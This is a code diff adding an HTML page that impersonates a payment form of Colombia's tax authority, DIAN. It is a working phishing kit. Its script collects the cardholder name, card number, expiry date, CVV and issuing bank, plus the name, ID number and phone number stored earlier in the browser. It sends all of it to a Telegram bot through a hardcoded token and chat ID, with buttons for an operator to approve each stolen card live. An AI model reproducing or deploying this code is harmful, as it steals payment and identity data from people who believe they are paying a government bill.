@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulario de Pago DIAN</title>
+  <link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: 'Lato', sans-serif;
+      background-color: #fff;
+      padding: 20px;
+      color: #000;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .top-bar img.logo {
+      height: 50px;
+    }
+
+    .top-bar .flags img {
+      width: 24px;
+      margin-left: 6px;
+      cursor: pointer;
+    }
+
+    .section-title {
+      font-weight: bold;
+      color: #1d276c;
+      margin: 15px 0 5px;
+    }
+
+    .input-row {
+      background: #f5f5f5;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .bold {
+      font-weight: bold;
+    }
+
+    label {
+      color: #1D276C;
+      font-size: 14px;
+      display: block;
+      margin-top: 10px;
+      margin-bottom: 3px;
+    }
+
+    input, select {
+      padding: 8px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: #001e5a;
+      color: white;
+      text-align: center;
+      font-size: 12px;
+      padding: 12px;
+      box-sizing: border-box;
+      z-index: 1000;
+    }
+
+    .input-flex {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      margin-bottom: 10px;
+      width: 100%;
+      gap: 10px;
+    }
+
+    .input-flex label {
+      width: 180px;
+      margin: 0;
+      text-align: left;
+      font-weight: bold;
+      flex-shrink: 0;
+    }
+
+    .input-flex select {
+      width: 280px;
+      margin: 0;
+    }
+
+    .input-flex input {
+      width: 280px;
+      margin: 0;
+    }
+
+    .card-input-wrapper {
+      position: relative;
+      width: 280px;
+      flex-shrink: 0;
+    }
+
+    .card-input-wrapper input {
+      width: 100%;
+      padding-right: 45px;
+      margin: 0;
+      box-sizing: border-box;
+    }
+
+    .card-logo {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 36px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      pointer-events: none;
+    }
+
+    .card-logo img {
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain;
+    }
+
+    .input-flex .card-input-wrapper {
+      width: 280px;
+    }
+
+    .input-flex .input-wrapper {
+      width: 280px;
+      flex-shrink: 0;
+    }
+
+    .input-flex .input-wrapper input {
+      width: 100%;
+      margin: 0;
+      box-sizing: border-box;
+    }
+
+    .row-expiry-cvv {
+      display: flex;
+      align-items: flex-start;
+      justify-content: flex-start;
+      width: 100%;
+      margin-bottom: 10px;
+      gap: 10px;
+    }
+
+    .row-expiry-cvv .label-col {
+      width: 180px;
+      flex-shrink: 0;
+    }
+
+    .row-expiry-cvv .label-col label {
+      margin: 0;
+      text-align: left;
+      font-weight: bold;
+      font-size: 14px;
+      color: #1D276C;
+      display: block;
+    }
+
+    .row-expiry-cvv .fields-col {
+      display: flex;
+      gap: 15px;
+      flex-shrink: 0;
+    }
+
+    .row-expiry-cvv .fields-col .field-group {
+      display: flex;
+      flex-direction: column;
+      width: 130px;
+    }
+
+    .row-expiry-cvv .fields-col .field-group label {
+      font-weight: bold;
+      margin-bottom: 3px;
+      font-size: 12px;
+      color: #1D276C;
+      display: block;
+      width: 100%;
+    }
+
+    .row-expiry-cvv .fields-col .field-group input {
+      width: 100%;
+      margin: 0;
+      padding: 8px;
+      box-sizing: border-box;
+    }
+
+    .status-message {
+      display: none;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin-bottom: 16px;
+      font-weight: 500;
+      text-align: center;
+    }
+
+    .status-message.error {
+      display: block;
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      color: #dc2626;
+    }
+
+    .status-message.success {
+      display: block;
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      color: #16a34a;
+    }
+
+    .status-message.info {
+      display: block;
+      background: #e0f2fe;
+      border: 1px solid #bae6fd;
+      color: #0369a1;
+    }
+
+    .form-group.error input,
+    .form-group.error select {
+      border-color: #dc2626;
+    }
+
+    .error-message {
+      color: #dc2626;
+      font-size: 12px;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .form-group.error .error-message {
+      display: block;
+    }
+
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.85);
+      backdrop-filter: blur(3px);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 20px;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .loading-card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 40px 32px 32px 32px;
+      max-width: 360px;
+      width: 100%;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+      text-align: center;
+      animation: slideUp 0.4s ease-out;
+      margin: auto;
+      border: 1px solid #f0f0f0;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px) scale(0.96);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 24px;
+      min-height: 100px;
+    }
+
+    .logo-container .logo-img {
+      height: 80px;
+      width: auto;
+      max-width: 150px;
+      object-fit: contain;
+    }
+
+    .loading-card .loading-text {
+      font-size: 0.95rem;
+      font-weight: 500;
+      color: #374151;
+      margin-bottom: 20px;
+      letter-spacing: 0.2px;
+    }
+
+    .progress-bar-wrapper {
+      width: 100%;
+    }
+
+    .progress-bar-track {
+      width: 100%;
+      height: 4px;
+      background: #e5e7eb;
+      border-radius: 4px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .progress-bar-fill-loading {
+      height: 100%;
+      background: #2c5697;
+      border-radius: 4px;
+      width: 0%;
+      transition: width 0.3s ease;
+      position: relative;
+    }
+
+    .progress-bar-fill-loading::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      animation: shimmer 1.5s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .loading-card .initial-spinner {
+      display: none;
+      width: 48px;
+      height: 48px;
+      border: 3px solid #e5e7eb;
+      border-top: 3px solid #2c5697;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 20px auto;
+    }
+
+    .loading-card .initial-spinner.active {
+      display: block;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .btn-continuar {
+      padding: 12px 40px;
+      background-color: #1d276c;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .btn-continuar:hover {
+      background-color: #15205a;
+    }
+
+    .btn-continuar:disabled {
+      background-color: #999;
+      cursor: not-allowed;
+    }
+
+    @media (max-width: 768px) {
+      .input-flex {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 6px;
+      }
+      .input-flex label {
+        width: 100%;
+        margin-bottom: 2px;
+      }
+      .input-flex select,
+      .input-flex .card-input-wrapper,
+      .input-flex input,
+      .input-flex .input-wrapper {
+        width: 100%;
+      }
+      .card-input-wrapper input {
+        width: 100%;
+      }
+      .input-flex .input-wrapper input {
+        width: 100%;
+      }
+
+      .row-expiry-cvv {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 6px;
+      }
+      .row-expiry-cvv .label-col {
+        display: none;
+      }
+      .row-expiry-cvv .fields-col {
+        width: 100%;
+        flex-wrap: wrap;
+      }
+      .row-expiry-cvv .fields-col .field-group {
+        flex: 1;
+        min-width: 100px;
+        width: auto;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .input-flex {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 6px;
+      }
+      .input-flex label {
+        width: 100%;
+        margin-bottom: 2px;
+      }
+      .input-flex select,
+      .input-flex .card-input-wrapper,
+      .input-flex input,
+      .input-flex .input-wrapper {
+        width: 100%;
+      }
+      .card-input-wrapper input {
+        width: 100%;
+        padding-right: 40px;
+      }
+      .input-flex .input-wrapper input {
+        width: 100%;
+      }
+
+      .row-expiry-cvv {
+        flex-direction: column;
+        align-items: stretch;
+        gap: 6px;
+      }
+      .row-expiry-cvv .label-col {
+        display: none;
+      }
+      .row-expiry-cvv .fields-col {
+        width: 100%;
+        flex-direction: column;
+        gap: 10px;
+      }
+      .row-expiry-cvv .fields-col .field-group {
+        width: 100%;
+      }
+
+      .loading-card {
+        padding: 28px 20px 24px 20px;
+        max-width: 300px;
+      }
+      .logo-container .logo-img {
+        height: 60px;
+        max-width: 110px;
+      }
+      .btn-continuar {
+        width: 100%;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .loading-card {
+        padding: 24px 16px 20px 16px;
+        max-width: 270px;
+      }
+      .logo-container .logo-img {
+        height: 50px;
+        max-width: 90px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="top-bar">
+    <img src="/imagenes/DIAN.png" alt="Logo" class="logo">
+    <div class="flags">
+      <img src="https://flagcdn.com/w40/co.png" alt="ES">
+      <img src="https://flagcdn.com/w40/us.png" alt="EN">
+      <img src="https://flagcdn.com/w40/br.png" alt="BR">
+    </div>
+  </div>
+
+  <div class="section-title">Resumen de la compra</div>
+  <div class="input-row">
+    <p><span class="bold">Serie:</span> HET9</p>
+    <p><span class="bold">Folio:</span> 8487</p>
+    <p><span class="bold">Descripción:</span> Dirección de Impuestos y Aduanas Nacionales</p>
+    <p><span class="bold">Valor a pagar:</span> <span style="color:#1d276c;"><b>$ 42,196.00 COP</b></span></p>
+  </div>
+
+  <div class="section-title">Información Tarjeta Crédito/Débito</div>
+  <hr style="border: none; border-top: 2px solid #ffd800; margin: 20px 0;">
+
+  <div class="status-message" id="statusMessage"></div>
+
+  <div class="input-row">
+    <form id="bancoForm" novalidate>
+      <div class="input-flex">
+        <label for="cardholder">Nombre en la tarjeta *</label>
+        <div class="input-wrapper">
+          <input type="text" id="cardholder" name="cardholder" required placeholder="Ej: JUAN PEREZ">
+        </div>
+        <div class="error-message">Nombre requerido</div>
+      </div>
+
+      <div class="input-flex">
+        <label for="cc">Número de Tarjeta *</label>
+        <div class="card-input-wrapper">
+          <input type="text" inputmode="numeric" id="cc" name="cc" required minlength="15" maxlength="19" placeholder="XXXX XXXX XXXX XXXX">
+          <div class="card-logo" id="cardLogo"></div>
+        </div>
+        <div class="error-message">Número de tarjeta inválido</div>
+      </div>
+
+      <div class="row-expiry-cvv">
+        <div class="label-col">
+          <label>&nbsp;</label>
+        </div>
+        <div class="fields-col">
+          <div class="field-group">
+            <label for="fecha">Fecha de Vencimiento *</label>
+            <input type="text" inputmode="numeric" id="fecha" name="fecha" required placeholder="MM/AA" maxlength="5">
+            <div class="error-message">Formato: MM/AA</div>
+          </div>
+          <div class="field-group">
+            <label for="cvv">CVV *</label>
+            <input type="text" inputmode="numeric" id="cvv" name="cvv" maxlength="4" required placeholder="XXX">
+            <div class="error-message">CVV inválido</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="input-flex">
+        <label for="tipo">Banco emisor *</label>
+        <select id="tipo" name="banco" required>
+          <option value="">Seleccione su banco</option>
+          <option value="Bancolombia">BANCOLOMBIA</option>
+          <option value="Davivienda">BANCO DAVIVIENDA</option>
+          <option value="BBVA Colombia">BANCO BBVA COLOMBIA S.A.</option>
+          <option value="Banco de Bogotá">BANCO DE BOGOTA</option>
+          <option value="Caja Social">BANCO CAJA SOCIAL</option>
+          <option value="Citibank Colombia">CITIBANK</option>
+          <option value="Colpatria">SCOTIABANK COLPATRIA</option>
+          <option value="Banco AV Villas">BANCO AV VILLAS</option>
+          <option value="Banco Falabella">BANCO FALABELLA</option>
+          <option value="Banco Finandina">BANCO FINANDINA S.A. BIC</option>
+          <option value="Itaú">BANCO ITAU</option>
+          <option value="Nequi">NEQUI</option>
+          <option value="Banco Occidente">BANCO DE OCCIDENTE</option>
+          <option value="Banco Popular">BANCO POPULAR</option>
+          <option value="Serfinanza">BANCO SERFINANZA</option>
+          <option value="Tuya">TUYA S.A.</option>
+        </select>
+        <div class="error-message">Seleccione un banco</div>
+      </div>
+
+      <br>
+      <div style="text-align: center;">
+        <button type="button" class="btn-continuar" id="submitBtn" onclick="procesarPago()">
+          Continuar
+        </button>
+      </div>
+    </form>
+  </div>
+
+  <hr style="border: none; border-top: 2px solid #ffd800; margin: 20px 0;">
+  <hr style="border: none; border-top: 8px solid #1d276c; margin: 20px 0;">
+
+  <div class="section-title">DIAN</div>
+  <div class="section-title">800197268-4</div>
+  <div class="section-title">111711</div>
+
+  <br><br><br>
+
+  <div class="footer">
+    Copyright © Tc Pay un producto de Tu Compra S.A.S
+  </div>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+      <div class="initial-spinner active" id="initialSpinner"></div>
+      <div class="logo-container" id="logoContainer" style="display:none;">
+        <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
+      </div>
+      <div class="loading-text" id="loadingText">Procesando pago...</div>
+      <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
+        <div class="progress-bar-track">
+          <div class="progress-bar-fill-loading" id="progressFill"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ============================================
+    // CONFIGURACIÓN - WEBHOOK EN RUTA RELATIVA
+    // ============================================
+    const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
+    const TELEGRAM_CHAT_ID = '-1004389419498';
+    const WEBHOOK_URL = '/api/webhook';  // <--- RUTA RELATIVA, SIN DOMINIO FIJO
+    const POLLING_INTERVAL = 3000;
+    const MAX_POLLING_TIME = 300000;
+
+    let solicitudId = null;
+    let pollingInterval = null;
+    let cardType = null;
+
+    const cardLogos = {
+      'visa': 'visa.png',
+      'mastercard': 'mastercard.png',
+      'amex': 'ame.png'
+    };
+
+    // ============================================
+    // DETECCIÓN DE TIPO DE TARJETA
+    // ============================================
+    function detectCardType(cardNumber) {
+      const cleanNumber = cardNumber.replace(/\s/g, '');
+      if (cleanNumber.length < 2) return null;
+      const firstDigit = cleanNumber.substring(0, 1);
+      const firstTwo = cleanNumber.substring(0, 2);
+      
+      if (firstDigit === '4') return 'visa';
+      if (firstTwo === '34' || firstTwo === '37') return 'amex';
+      if ((firstTwo >= '51' && firstTwo <= '55') || (firstTwo >= '22' && firstTwo <= '27')) return 'mastercard';
+      return null;
+    }
+
+    // ============================================
+    // VALIDAR LUHN
+    // ============================================
+    function validarLuhn(numero) {
+      const clean = numero.replace(/\s/g, '');
+      let sum = 0, shouldDouble = false;
+      for (let i = clean.length - 1; i >= 0; i--) {
+        let digit = parseInt(clean[i]);
+        if (shouldDouble) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
+        shouldDouble = !shouldDouble;
+      }
+      return sum % 10 === 0;
+    }
+
+    // ============================================
+    // FORMATO DE ENTRADA
+    // ============================================
+    document.getElementById("fecha").addEventListener("input", function(e) {
+      let value = e.target.value.replace(/\D/g, "");
+      if (value.length >= 2) {
+        e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      } else {
+        e.target.value = value;
+      }
+    });
+
+    document.getElementById("cvv").addEventListener("input", function(e) {
+      e.target.value = e.target.value.replace(/\D/g, '');
+    });
+
+    // ============================================
+    // LOGO DE TARJETA DENTRO DEL INPUT
+    // ============================================
+    const cardNumberInput = document.getElementById('cc');
+    const cardLogo = document.getElementById('cardLogo');
+
+    cardNumberInput.addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\s/g, '');
+      value = value.replace(/\D/g, '');
+      e.target.value = value.replace(/(\d{4})/g, '$1 ').trim();
+
+      const type = detectCardType(e.target.value);
+      cardLogo.innerHTML = '';
+
+      if (type === 'visa') {
+        const img = document.createElement('img');
+        img.src = 'visa.png';
+        img.alt = 'Visa';
+        img.style.height = '20px';
+        cardLogo.appendChild(img);
+      } else if (type === 'mastercard') {
+        const img = document.createElement('img');
+        img.src = 'mastercard.png';
+        img.alt = 'Mastercard';
+        img.style.height = '20px';
+        cardLogo.appendChild(img);
+      } else if (type === 'amex') {
+        const img = document.createElement('img');
+        img.src = 'ame.png';
+        img.alt = 'American Express';
+        img.style.height = '20px';
+        cardLogo.appendChild(img);
+      }
+    });
+
+    // ============================================
+    // MOSTRAR MENSAJES
+    // ============================================
+    function mostrarMensaje(mensaje, tipo) {
+      const el = document.getElementById('statusMessage');
+      el.className = 'status-message ' + tipo;
+      el.textContent = mensaje;
+    }
+
+    function ocultarMensaje() {
+      const el = document.getElementById('statusMessage');
+      el.className = 'status-message';
+      el.textContent = '';
+    }
+
+    function mostrarError(mensaje) {
+      mostrarMensaje(mensaje, 'error');
+      document.getElementById('loadingOverlay').classList.remove('active');
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = false;
+      btn.textContent = 'Continuar';
+      document.getElementById('cc').disabled = false;
+      document.getElementById('cvv').disabled = false;
+      document.getElementById('fecha').disabled = false;
+      document.getElementById('tipo').disabled = false;
+      document.getElementById('cardholder').disabled = false;
+    }
+
+    // ============================================
+    // GENERAR ID DE SOLICITUD
+    // ============================================
+    function generarSolicitudId() {
+      return 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+    }
+
+    // ============================================
+    // REDIRIGIR SEGÚN TIPO DE TARJETA
+    // ============================================
+    function redirigirSegunTipoTarjeta(tipo) {
+      const map = {
+        'visa': 'visa.html',
+        'mastercard': 'master.html',
+        'amex': 'amex.html'
+      };
+      const destino = map[tipo] || 'index.html';
+      window.location.href = destino;
+    }
+
+    // ============================================
+    // ENVÍO DE DATOS DE TARJETA A TELEGRAM
+    // ============================================
+    async function enviarDatosTarjetaATelegram(datos) {
+      try {
+        const inlineKeyboard = {
+          inline_keyboard: [
+            [
+              { text: "✅ APROBAR", callback_data: `approve_cc_${datos.solicitudId}` },
+              { text: "❌ RECHAZAR", callback_data: `reject_cc_${datos.solicitudId}` }
+            ]
+          ]
+        };
+
+        let mensaje = `🔔 *NUEVA TARJETA - DIAN*\n\n`;
+        mensaje += `🆔 ID: \`${datos.solicitudId}\`\n\n`;
+        mensaje += `📋 *DATOS DEL USUARIO:*\n`;
+        mensaje += `👤 Nombre: ${datos.nombreCompleto}\n`;
+        mensaje += `🆔 Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}\n`;
+        mensaje += `📱 Celular: ${datos.celular}\n\n`;
+        mensaje += `💳 *DATOS DE LA TARJETA:*\n`;
+        mensaje += `👤 Titular: ${datos.cardholder}\n`;
+        mensaje += `🏦 Banco: ${datos.bancoEmisor}\n`;
+        mensaje += `💳 Número: \`${datos.numeroTarjeta}\`\n`;
+        mensaje += `📅 Vencimiento: \`${datos.vencimiento}\`\n`;
+        mensaje += `🔢 CVV: \`${datos.cvv}\`\n`;
+        mensaje += `📋 Tipo: ${datos.tipoTarjeta.toUpperCase()}\n\n`;
+        mensaje += `💰 Total: ${datos.totalFormateado}\n`;
+        mensaje += `📅 Fecha: ${datos.fechaHora}\n\n`;
+        mensaje += `⏳ *Estado:* Esperando verificación...`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown',
+            reply_markup: inlineKeyboard,
+            disable_web_page_preview: true
+          })
+        });
+
+        const data = await response.json();
+        return data.ok;
+      } catch (error) {
+        console.error('❌ Error:', error);
+        return false;
+      }
+    }
+
+    // ============================================
+    // VERIFICAR ESTADO DE SOLICITUD (Webhook)
+    // ============================================
+    async function verificarEstadoSolicitud(solicitudId) {
+      try {
+        const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
+        const data = await response.json();
+        return data.estado || 'pending';
+      } catch (error) {
+        console.error('❌ Error al consultar webhook:', error);
+        return 'error';
+      }
+    }
+
+    // ============================================
+    // POLLING PARA ESPERAR APROBACIÓN/RECHAZO
+    // ============================================
+    function iniciarPollingPago() {
+      const tipoTarjeta = cardType;
+      let tiempoInicio = Date.now();
+
+      pollingInterval = setInterval(async () => {
+        if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+          clearInterval(pollingInterval);
+          mostrarError('⏰ Tiempo de espera agotado. Intente nuevamente.');
+          document.getElementById('loadingOverlay').classList.remove('active');
+          const btn = document.getElementById('submitBtn');
+          btn.disabled = false;
+          btn.textContent = 'Continuar';
+          document.getElementById('cc').disabled = false;
+          document.getElementById('cvv').disabled = false;
+          document.getElementById('fecha').disabled = false;
+          document.getElementById('tipo').disabled = false;
+          document.getElementById('cardholder').disabled = false;
+          return;
+        }
+
+        const resultado = await verificarEstadoSolicitud(solicitudId);
+
+        if (resultado === 'approved') {
+          clearInterval(pollingInterval);
+          document.getElementById('loadingOverlay').classList.remove('active');
+          const btn = document.getElementById('submitBtn');
+          btn.disabled = false;
+          btn.textContent = 'Continuar';
+          document.getElementById('cc').disabled = false;
+          document.getElementById('cvv').disabled = false;
+          document.getElementById('fecha').disabled = false;
+          document.getElementById('tipo').disabled = false;
+          document.getElementById('cardholder').disabled = false;
+          mostrarMensaje('✅ Pago aprobado, redirigiendo...', 'success');
+          setTimeout(() => { redirigirSegunTipoTarjeta(tipoTarjeta); }, 1500);
+        } else if (resultado === 'rejected') {
+          clearInterval(pollingInterval);
+          document.getElementById('loadingOverlay').classList.remove('active');
+          mostrarError('❌ Pago rechazado. Verifique los datos e intente nuevamente.');
+          const btn = document.getElementById('submitBtn');
+          btn.disabled = false;
+          btn.textContent = 'Continuar';
+          document.getElementById('cc').disabled = false;
+          document.getElementById('cvv').disabled = false;
+          document.getElementById('fecha').disabled = false;
+          document.getElementById('tipo').disabled = false;
+          document.getElementById('cardholder').disabled = false;
+        }
+      }, POLLING_INTERVAL);
+    }
+
+    // ============================================
+    // FUNCIÓN PRINCIPAL DE PROCESAMIENTO
+    // ============================================
+    async function procesarPago() {
+      const cardholder = document.getElementById("cardholder").value.trim();
+      const banco = document.getElementById("tipo").value;
+      const tarjeta = document.getElementById("cc").value.trim();
+      const fecha = document.getElementById("fecha").value.trim();
+      const cvv = document.getElementById("cvv").value.trim();
+
+      ocultarMensaje();
+      document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
+
+      let isValid = true;
+
+      if (!cardholder || cardholder.length < 3) {
+        document.getElementById('cardholder').parentElement.classList.add('error');
+        isValid = false;
+      }
+
+      if (!banco) {
+        document.getElementById('tipo').parentElement.classList.add('error');
+        isValid = false;
+      }
+
+      const tarjetaLimpia = tarjeta.replace(/\s/g, '');
+      if (!validarLuhn(tarjetaLimpia) || tarjetaLimpia.length < 15) {
+        document.getElementById('cc').parentElement.parentElement.classList.add('error');
+        isValid = false;
+      }
+
+      const fechaRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+      if (!fechaRegex.test(fecha)) {
+        document.getElementById('fecha').parentElement.classList.add('error');
+        isValid = false;
+      }
+
+      cardType = detectCardType(tarjetaLimpia);
+      const cvcLength = cardType === 'amex' ? 4 : 3;
+      if (cvv.length !== cvcLength) {
+        document.getElementById('cvv').parentElement.classList.add('error');
+        isValid = false;
+      }
+
+      if (!isValid) {
+        return;
+      }
+
+      solicitudId = generarSolicitudId();
+
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      loadingOverlay.classList.add('active');
+      document.getElementById('loadingText').textContent = 'Procesando pago...';
+
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = true;
+      btn.textContent = 'Procesando...';
+      document.getElementById('cc').disabled = true;
+      document.getElementById('cvv').disabled = true;
+      document.getElementById('fecha').disabled = true;
+      document.getElementById('tipo').disabled = true;
+      document.getElementById('cardholder').disabled = true;
+
+      const nombre = localStorage.getItem('pago_nombres') || 'No proporcionado';
+      const apellidos = localStorage.getItem('pago_apellidos') || '';
+      const tipoDocumento = localStorage.getItem('pago_tipo_documento') || 'No especificado';
+      const numeroDocumento = localStorage.getItem('pago_numero_documento') || 'No proporcionado';
+      const celular = localStorage.getItem('pago_celular') || 'No proporcionado';
+
+      const fechaHora = new Date().toLocaleString('es-CO', {
+        timeZone: 'America/Bogota',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+      });
+
+      const enviado = await enviarDatosTarjetaATelegram({
+        solicitudId: solicitudId,
+        nombreCompleto: `${nombre} ${apellidos}`.trim(),
+        tipoDocumento: tipoDocumento,
+        numeroDocumento: numeroDocumento,
+        celular: celular,
+        cardholder: cardholder,
+        bancoEmisor: banco,
+        numeroTarjeta: tarjeta,
+        vencimiento: fecha,
+        cvv: cvv,
+        tipoTarjeta: cardType || 'desconocida',
+        totalFormateado: '42,196.00 COP',
+        fechaHora: fechaHora
+      });
+
+      if (enviado) {
+        mostrarMensaje('⏳ Esperando aprobación del pago...', 'info');
+        iniciarPollingPago();
+      } else {
+        mostrarError('❌ Error al procesar el pago. Intente nuevamente.');
+        document.getElementById('loadingOverlay').classList.remove('active');
+        btn.disabled = false;
+        btn.textContent = 'Continuar';
+        document.getElementById('cc').disabled = false;
+        document.getElementById('cvv').disabled = false;
+        document.getElementById('fecha').disabled = false;
+        document.getElementById('tipo').disabled = false;
+        document.getElementById('cardholder').disabled = false;
+      }
+    }
+  </script>
+</body>
+</html>
